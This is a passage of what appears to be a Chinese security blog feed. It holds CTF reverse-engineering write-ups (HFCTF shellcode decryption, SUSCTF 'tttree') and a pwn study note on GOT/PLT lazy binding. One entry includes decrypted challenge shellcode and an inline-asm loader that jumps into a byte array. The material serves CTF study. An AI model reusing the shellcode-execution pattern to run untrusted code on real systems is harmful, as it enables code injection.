class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0xAB</span>, <span class="number">0x68</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x3A</span>, <span class="number">0xBC</span>, <span class="number">0x2F</span>, <span class="number">0x54</span>, <span class="number">0x17</span>, <span class="number">0x16</span>,</span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0xD6</span>, <span class="number">0xE5</span>, <span class="number">0xBB</span>, <span class="number">0x0D</span>, <span class="number">0xAD</span>, <span class="number">0xE3</span>, <span class="number">0xBB</span>, <span class="number">0xF7</span>, <span class="number">0x62</span>,</span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x8C</span>, <span class="number">0xD6</span>, <span class="number">0xC8</span>, <span class="number">0x0E</span>, <span class="number">0x95</span>, <span class="number">0x0E</span>, <span class="number">0x88</span>, <span class="number">0xBA</span>, <span class="number">0x25</span>,</span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0xF8</span>, <span class="number">0x4C</span>, <span class="number">0x26</span>, <span class="number">0x7A</span>, <span class="number">0x76</span>, <span class="number">0x14</span>, <span class="number">0xE0</span>, <span class="number">0x7C</span>, <span class="number">0x9A</span>,</span><br><span class="line">  <span class="number">0xEE</span>, <span class="number">0xC9</span>, <span class="number">0x8B</span>, <span class="number">0x5C</span>, <span class="number">0xD4</span>, <span class="number">0xF7</span>, <span class="number">0x9E</span>, <span class="number">0x5D</span>, <span class="number">0xDE</span>, <span class="number">0xAC</span>,</span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0xB9</span>, <span class="number">0x13</span>, <span class="number">0x8E</span>, <span class="number">0xEC</span>, <span class="number">0xB2</span>, <span class="number">0x2D</span>, <span class="number">0x23</span>, <span class="number">0x68</span>, <span class="number">0xEE</span>,</span><br><span class="line">  <span class="number">0xCE</span>, <span class="number">0x5F</span>, <span class="number">0x7C</span>, <span class="number">0x92</span>, <span class="number">0x5D</span>, <span class="number">0xA8</span>, <span class="number">0xE3</span>, <span class="number">0xC9</span>, <span class="number">0x6B</span>, <span class="number">0xB5</span>,</span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0xAC</span>, <span class="number">0x12</span>, <span class="number">0xE7</span>, <span class="number">0xB6</span>, <span class="number">0x42</span>, <span class="number">0xDA</span>, <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0xCD</span>,</span><br><span class="line">  <span class="number">0x58</span>, <span class="number">0x1C</span>, <span class="number">0xF1</span>, <span class="number">0xFC</span>, <span class="number">0xEE</span>, <span class="number">0x75</span>, <span class="number">0x70</span>, <span class="number">0xF5</span>, <span class="number">0x78</span>, <span class="number">0xE6</span>,</span><br><span class="line">  <span class="number">0x76</span>, <span class="number">0x50</span>, <span class="number">0x35</span>, <span class="number">0x6A</span>, <span class="number">0xD6</span>, <span class="number">0xD4</span>, <span class="number">0xB9</span>, <span class="number">0x5A</span>, <span class="number">0x10</span>, <span class="number">0x95</span>,</span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x44</span>, <span class="number">0xB0</span>, <span class="number">0x1B</span>, <span class="number">0x59</span>, <span class="number">0xB9</span>, <span class="number">0x40</span>, <span class="number">0xB2</span>, <span class="number">0x1A</span>, <span class="number">0x26</span>,</span><br><span class="line">  <span class="number">0x4E</span>, <span class="number">0x7B</span>, <span class="number">0xD8</span>, <span class="number">0x29</span>, <span class="number">0xD1</span>, <span class="number">0x23</span>, <span class="number">0xCD</span>, <span class="number">0x52</span>, <span class="number">0xE7</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x8F</span>, <span class="number">0xA7</span>, <span class="number">0x4E</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span>* v = (<span class="keyword">uint32_t</span> *)enc_shellcode;</span><br><span class="line"><span class="keyword">uint32_t</span> <span class="keyword">const</span> k[<span class="number">4</span>] = &#123;<span class="number">116</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">97</span> &#125;;</span><br><span class="line"><span class="built_in">btea</span>(v, <span class="number">-66</span>, k);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">264</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">enc_shellcode[i] = ((enc_shellcode[i] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0XFF</span>) | ((enc_shellcode[i] &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0XFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">264</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, enc_shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64加密后是:<br>YPxoTHcmBzPSZItSMItSDItSFItyKA+3SiYz/zPArDxhfAIsIMHPDQP44vBSV4tSEItCPAPCi0B4hcAPhL4AAAADwlCLSBiLWCAD2oP5AA+EqQAAAEmLNIsD8jP/M8Cswc8NA/g6xHX0A3wkBDt8JAx12TP/M8mDwlAPtgQKwc8NA/hBg/kOdfHBzw1XM/8zyYtUJDxSD7YcDrhnZmZm9+vR+ovCwegfA8KNBIAr2FoPtgQKK8PBzw0D+EGD+Q511MHPDTs8JHQWaCVzAACLxGhubwAAVFCLXCRI/9PrFGglcwAAi8RoeWVzAFRQi1wkSP/TWFhYWFhYWFhYYcNYX1qLEukL////</p><p>写程序，直接F5看shellcode</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = &#123; <span class="number">0x60</span>, <span class="number">0xfc</span>, <span class="number">0x68</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x7</span>, <span class="number">0x33</span>, <span class="number">0xd2</span>, <span class="number">0x64</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x30</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0xc</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x14</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x28</span>, <span class="number">0xf</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x33</span>, <span class="number">0xff</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x2</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0xf8</span>, <span class="number">0xe2</span>, <span class="number">0xf0</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x10</span>, <span class="number">0x8b</span>, <span class="number">0x42</span>, <span class="number">0x3c</span>, <span class="number">0x3</span>, <span class="number">0xc2</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x78</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0xf</span>, <span class="number">0x84</span>, <span class="number">0xbe</span>, <span class="number">00</span>, <span class="number">00</span>, <span class="number">00</span>, <span class="number">0x3</span>, <span class="number">0xc2</span>, <span class="number">0x50</span>, <span class="number">0x8b</span>, <span class="number">0x48</span>, <span class="number">0x18</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x20</span>, <span class="number">0x3</span>, <span class="number">0xda</span>, <span class="number">0x83</span>, <span class="number">0xf9</span>, <span class="number">00</span>, <span class="number">0xf</span>, <span class="number">0x84</span>, <span class="number">0xa9</span>, <span class="number">00</span>, <span class="number">00</span>, <span class="number">00</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x8b</span>, <span class="number">0x3</span>, <span class="number">0xf2</span>, <span class="number">0x33</span>, <span class="number">0xff</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0xf8</span>, <span class="number">0x3a</span>, <span class="number">0xc4</span>, <span class="number">0x75</span>, <span class="number">0xf4</span>, <span class="number">0x3</span>, <span class="number">0x7c</span>, <span class="number">0x24</span>, <span class="number">0x4</span>, <span class="number">0x3b</span>, <span class="number">0x7c</span>, <span class="number">0x24</span>, <span class="number">0xc</span>, <span class="number">0x75</span>, <span class="number">0xd9</span>, <span class="number">0x33</span>, <span class="number">0xff</span>, <span class="number">0x33</span>, <span class="number">0xc9</span>, <span class="number">0x83</span>, <span class="number">0xc2</span>, <span class="number">0x50</span>, <span class="number">0xf</span>, <span class="number">0xb6</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0xf8</span>, <span class="number">0x41</span>, <span class="number">0x83</span>, <span class="number">0xf9</span>, <span class="number">0xe</span>, <span class="number">0x75</span>, <span class="number">0xf1</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0xd</span>, <span class="number">0x57</span>, <span class="number">0x33</span>, <span class="number">0xff</span>, <span class="number">0x33</span>, <span class="number">0xc9</span>, <span class="number">0x8b</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x3c</span>, <span class="number">0x52</span>, <span class="number">0xf</span>, <span class="number">0xb6</span>, <span class="number">0x1c</span>, <span class="number">0xe</span>, <span class="number">0xb8</span>, <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0xf7</span>, <span class="number">0xeb</span>, <span class="number">0xd1</span>, <span class="number">0xfa</span>, <span class="number">0x8b</span>, <span class="number">0xc2</span>, <span class="number">0xc1</span>, <span class="number">0xe8</span>, <span class="number">0x1f</span>, <span class="number">0x3</span>, <span class="number">0xc2</span>, <span class="number">0x8d</span>, <span class="number">0x4</span>, <span class="number">0x80</span>, <span class="number">0x2b</span>, <span class="number">0xd8</span>, <span class="number">0x5a</span>, <span class="number">0xf</span>, <span class="number">0xb6</span>, <span class="number">0x4</span>, <span class="number">0xa</span>, <span class="number">0x2b</span>, <span class="number">0xc3</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0xd</span>, <span class="number">0x3</span>, <span class="number">0xf8</span>, <span class="number">0x41</span>, <span class="number">0x83</span>, <span class="number">0xf9</span>, <span class="number">0xe</span>, <span class="number">0x75</span>, <span class="number">0xd4</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0xd</span>, <span class="number">0x3b</span>, <span class="number">0x3c</span>, <span class="number">0x24</span>, <span class="number">0x74</span>, <span class="number">0x16</span>, <span class="number">0x68</span>, <span class="number">0x25</span>, <span class="number">0x73</span>, <span class="number">00</span>, <span class="number">00</span>, <span class="number">0x8b</span>, <span class="number">0xc4</span>, <span class="number">0x68</span>, <span class="number">0x6e</span>, <span class="number">0x6f</span>, <span class="number">00</span>, <span class="number">00</span>, <span class="number">0x54</span>, <span class="number">0x50</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xd3</span>, <span class="number">0xeb</span>, <span class="number">0x14</span>, <span class="number">0x68</span>, <span class="number">0x25</span>, <span class="number">0x73</span>, <span class="number">00</span>, <span class="number">00</span>, <span class="number">0x8b</span>, <span class="number">0xc4</span>, <span class="number">0x68</span>, <span class="number">0x79</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">00</span>, <span class="number">0x54</span>, <span class="number">0x50</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xd3</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x61</span>, <span class="number">0xc3</span>, <span class="number">0x58</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>, <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xe9</span>, <span class="number">0xb</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm &#123;</span><br><span class="line">lea eax, shellcode;</span><br><span class="line">push eax;</span><br><span class="line">ret</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配合OD动调分析如下图</p><img src="/2022/03/21/2022%E8%99%8E%E7%AC%A6CTF_%E9%83%A8%E5%88%86RE_WP/11-16478420546541.png" class="" title="img"><p>写脚本解密即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">key = [1, 1, 2, 0, 1, 0, 3, 4, 2, 4, 1, 4, 0, 0]</span><br><span class="line">flag_fake = b&quot;is program can&quot;</span><br><span class="line"></span><br><span class="line">flag = [flag_fake[i] + key[i] for i in range(14)]</span><br><span class="line">print(bytes(flag))</span><br><span class="line"># b&#x27;jt&quot;psojvcq!gan&#x27;</span><br><span class="line">a = b&quot;YPxoTHcmBzPSZItSMItSDItSFItyKA+3SiYz/zPArDxhfAIsIMHPDQP44vBSV4tSEItCPAPCi0B4hcAPhL4AAAADwlCLSBiLWCAD2oP5AA+EqQAAAEmLNIsD8jP/M8Cswc8NA/g6xHX0A3wkBDt8JAx12TP/M8mDwlAPtgQKwc8NA/hBg/kOdfHBzw1XM/8zyYtUJDxSD7YcDrhnZmZm9+vR+ovCwegfA8KNBIAr2FoPtgQKK8PBzw0D+EGD+Q511MHPDTs8JHQWaCVzAACLxGhubwAAVFCLXCRI/9PrFGglcwAAi8RoeWVzAFRQi1wkSP/TWFhYWFhYWFhYYcNYX1qLEukL////&quot; + b&#x27;jt&quot;psojvcq!gan&#x27;</span><br><span class="line">print(&quot;HFCTF&#123;&quot; + md5(a).hexdigest() + &quot;&#125;&quot;)</span><br><span class="line"># HFCTF&#123;2b794e95022f2fe46106c21bbf57a755&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第2章_二进制文件</title>
      <link href="/2022/03/16/%E7%AC%AC2%E7%AB%A0_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
      <url>/2022/03/16/%E7%AC%AC2%E7%AB%A0_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>看到静态链接和动态链接这里，静态链接和windows上感觉一样，就不写了，感觉这里有个位置无关代码和延迟绑定挺有意思，记录一下</p><h2 id="位置无关代码"><a href="#位置无关代码" class="headerlink" title="位置无关代码"></a>位置无关代码</h2><p>​    在windows平台上，对于DLL文件的全局变量，在DLL加载到内存中后，要是没有加载到对应的位置，需要重定位，这个时候就需要重定位表, 而这里提到了一个位置无关代码的概念，可以加载而无需重定位的代码称为位置无关代码（Position-Independent Code, PIC），通过GCC传递 -fpic 参数就可以生成PIC。</p><p>1个ELF文件本身，数据段和代码段的相对距离是不变的，因此指令和变量之间的举例就是一个运行时常量，与绝对地址无关，这就是PIC的核心。</p><p>全局偏移量表GOT（Global Offset Table）被拆分为.got节和.got.plt节，可以理解为是个数组，单位是8字节</p><ol><li>.got 不需要延迟绑定，用于保存全局变量引用，加载到内存标记为只读</li><li>.got.plt 需要延迟绑定，保存函数引用，具有读写权限</li></ol><p>写代码测试下 (比书上多加了一个func2，为了测试延迟绑定调用那个_dl_runtime_resolve前的push ,是不是push的func的索引)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> shared;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> *b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">func2</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> *b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a= <span class="number">100</span>;</span><br><span class="line">    func(&amp;a, &amp;shared);</span><br><span class="line">    func2(&amp;a, &amp;shared);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//func.c</span></span><br><span class="line"><span class="keyword">int</span> shared = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> * a, <span class="keyword">int</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">(<span class="keyword">int</span> * a, <span class="keyword">int</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   *a = *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fpic -o func.so func.c</span><br><span class="line">gcc -fno-stack-protector -fno-pie -no-pie -o func.ELF2 main.c ./func.so <span class="comment"># 这里与书上不一样，查到-fno-pie -no-pie 去除地址随机化，要不影响实验</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">╭─ ~/Desktop/testC/dyn                                                                                                               ✔ </span><br><span class="line">╰─ objdump -d -M intel --section=.text func.so | grep -A 10 <span class="string">&quot;&lt;func&gt;&quot;</span></span><br><span class="line">00000000000005ea &lt;func&gt;:</span><br><span class="line"> 5ea:55                   push   rbp</span><br><span class="line"> 5eb:48 89 e5             mov    rbp,rsp</span><br><span class="line"> 5ee:48 89 7d f8          mov    QWORD PTR [rbp-0x8],rdi</span><br><span class="line"> 5f2:48 89 75 f0          mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line"> 5f6:48 8b 45 f8          mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line"> 5fa:8b 10                mov    edx,DWORD PTR [rax]</span><br><span class="line"> 5fc:48 8b 05 d5 09 20 00 mov    rax,QWORD PTR [rip+0x2009d5]        <span class="comment"># 200fd8 &lt;tmp-0x50&gt;</span></span><br><span class="line"> 603:89 10                mov    DWORD PTR [rax],edx</span><br><span class="line"> 605:48 8b 45 f0          mov    rax,QWORD PTR [rbp-0x10]</span><br><span class="line"> 609:8b 10                mov    edx,DWORD PTR [rax]</span><br></pre></td></tr></table></figure><p>因为这个地方写的是RIP +0x2009d5， 是一个偏移，而不是一个写死的地址，所以是PIC, 因为RIP其实就是基址+ 固定的偏移，所以不管基址怎么变化，这个地方的RIP + 0X2009E5指向的总是tmp变量， 如下如，这里是IDA动态调试起来的样子。</p><img src="/2022/03/16/%E7%AC%AC2%E7%AB%A0_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/image-20220314210016859.png" class="" title="image-20220314210016859"><h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>​        对于调用的别的so中的函数，只有当这个函数真正调用的时候，才往对应地址处写入这个函数的地址，因为如果导入的函数比较多，都在一开始加载地址的话，会影响性能。</p><p>ELF文件通过过程链接表（Procedure Linkage Table, PLT）和GOT表配合来实现延迟绑定。，PLT也是个数组，单位是16字节，PLT[0]是用于跳转到动态链接器，IDA远程动态调试观, 在call func处下断点，观察PLT(指的是.plt节处的数据) 和 GOT(这里指的是.got.plt节处的数据)，整理下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 下断点位置</span><br><span class="line">.text:0000000000400652 E8 E9 FE FF FF                call    sub_400540    ; func函数</span><br><span class="line"># PLT[0] </span><br><span class="line">.plt:0000000000400520 push    cs:qword_601008</span><br><span class="line">.plt:0000000000400526 jmp     cs:qword_601010</span><br><span class="line"># PLT[1]</span><br><span class="line">.plt:0000000000400530 jmp     cs:off_601018</span><br><span class="line">.plt:0000000000400536 push    0</span><br><span class="line">.plt:000000000040053B jmp     sub_400520</span><br><span class="line"># PLT[2]</span><br><span class="line">.plt:0000000000400540 jmp     cs:off_601020</span><br><span class="line">.plt:0000000000400546 push    1</span><br><span class="line">.plt:000000000040054B jmp     sub_400520</span><br><span class="line"># GOT[0]</span><br><span class="line">.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class="line"># GOT[1]</span><br><span class="line">.got.plt:0000000000601008 qword_601008 dq 7F53FD96D170h           ; DATA XREF: sub_400520↑r ;reloc entries</span><br><span class="line"># GOT[2]</span><br><span class="line">.got.plt:0000000000601010 qword_601010 dq 7F53FD7598F0h           ; DATA XREF: sub_400520+6↑r ; _dl_runtime_resolve</span><br><span class="line"># GOT[3]</span><br><span class="line">.got.plt:0000000000601018 off_601018 dq offset sub_400536         ; DATA XREF: .plt:loc_400530↑r; func2</span><br><span class="line"># GOT[4]</span><br><span class="line">.got.plt:0000000000601020 off_601020 dq offset sub_400546         ; DATA XREF: .plt:loc_400540↑r; func</span><br></pre></td></tr></table></figure><p>然后再在call func2那里下断点，再次观察PLT表和GOT表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400663 E8 C8 FE FF FF                call    loc_400530  ; func2函数</span><br><span class="line"># GOT[3]</span><br><span class="line">.got.plt:0000000000601018 off_601018 dq offset sub_400536         ; DATA XREF: .plt:loc_400530↑r; func2</span><br><span class="line"># GOT[4]</span><br><span class="line">got.plt:0000000000601020 off_601020 dq offset func           ; DATA XREF: .plt:loc_400540↑r; func</span><br></pre></td></tr></table></figure><p>可以发现GOT[4]这里已经填入了真正的函数地址，因为前面在调用func的时候,压入了1，而func在GOT表中，在函数的索引这里确实是1（除去其他固定的DYNAMIC， reloc entries， 和dl_runtime_resolve）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.plt:0000000000400546 push    1</span><br><span class="line">.plt:000000000040054B jmp     sub_400520</span><br></pre></td></tr></table></figure><p>在调用func2的时候是push 0 ，我们这里把0改为1，patch下，测试下我们的猜想</p><img src="/2022/03/16/%E7%AC%AC2%E7%AB%A0_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/image-20220314211726468.png" class="" title="image-20220314211726468"><p>执行，可以发现确实是调用了func函数</p><img src="/2022/03/16/%E7%AC%AC2%E7%AB%A0_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/image-20220314211832466.png" class="" title="image-20220314211832466"><p>再观察下GOT表，看看有没有变化</p><img src="/2022/03/16/%E7%AC%AC2%E7%AB%A0_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/image-20220314211953201.png" class="" title="image-20220314211953201"><p>显然，GOT表没有变化，所以猜测成功。</p><p>这里用EXCLE表格来表示下整体的流程</p><img src="/2022/03/16/%E7%AC%AC2%E7%AB%A0_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/image-20220314215401715.png" class="" title="image-20220314215401715">]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 读书笔记 </tag>
            
            <tag> 《CTF竞赛权威指南-pwn篇》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022_SUSCTF_tttree题解</title>
      <link href="/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/"/>
      <url>/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-SUSCTF-tttree题解"><a href="#2022-SUSCTF-tttree题解" class="headerlink" title="2022_SUSCTF_tttree题解"></a>2022_SUSCTF_tttree题解</h1><p>这道题比赛时，逆出了整个节点结构体，就是最后通过二叉树找到索引的时候不会了，只爆破出来了flag的4位，后来看了看别人的WP才发现程序中是存着节点之间的关系的（可惜啊，当时调试还是没有足够的耐心啊，这里复现下，</p><hr><p>首先将程序去除ASLR, 用CFF Explorer打开程序，去除去除DLL Can move的属性，然后保存，这样每次程序加载的基址就不会变，就可以方便的下断点了</p><img src="/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/image-20220302214615494.png" class="" title="image-20220302214615494"><p>输入flag，按下暂停键，</p><img src="/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/image-20220302214039745.png" class="" title="image-20220302214039745"><p>然后回车，程序断下，直接ALT+F9 运行到用户代码</p><img src="/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/image-20220302214459977.png" class="" title="image-20220302214459977"><p>观察堆栈，可以发现在00014000E1B0的位置处存着输入的flag，直接转过去，下硬件断点，然后执行</p><img src="/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/image-20220302215222388.png" class="" title="image-20220302215222388"><p>发现程序是从1开始验证的，正好略过了前面的SUSCTF，也就是说他会检测SUSCTF{xxx } 里的 xxx，这里就会发现程序用了花指令，每一段里面存放着1条真正的指令</p><img src="/2022/03/03/2022_SUSCTF%E9%83%A8%E5%88%86RE_WP/image-20220302215358923.png" class="" title="image-20220302215358923"><p>一路F7，观察执行的汇编，整理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">RAX是自己输入的字符<span class="comment"># 0x31</span></span><br><span class="line">RDX <span class="comment"># 0X60每一次都是固定的</span></span><br><span class="line">RCX  <span class="comment"># mov ecx, dword ptr ss:[rsp+0x30]  也是每次固定的数据  0XC1</span></span><br><span class="line">RCX = 